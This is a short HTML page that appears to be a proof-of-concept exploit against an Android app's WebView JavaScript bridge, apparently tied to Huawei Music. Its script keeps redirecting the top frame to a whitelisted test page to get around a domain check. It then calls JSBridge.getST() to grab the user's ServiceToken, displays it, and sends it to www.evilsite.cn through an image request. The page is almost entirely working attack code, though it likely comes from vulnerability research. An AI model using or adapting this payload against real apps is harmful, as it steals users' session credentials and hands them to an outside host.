        <title></title>

    <body>
        <p id="content">ICSL</p>
        <script>

        function gotowhite(){
            top.location.href = "https://stevensun123.github.io/HiApp/WebViewTest.html";
        }
        
        function evil(){
            var result = window.JSBridge.getST();
            document.getElementById("content").innerText = "www.evilsite.cn成功调用getST获取到ServiceToken：\n"+result;
            document.body.appendChild(document.createElement("img")).src = "https://www.evilsite.cn/abc?from_Huawei_Music="+result;
        }
        
        setInterval(gotowhite,5);//5毫秒
        setTimeout(evil,3000);//倒计时3秒
        </script>
    </body>
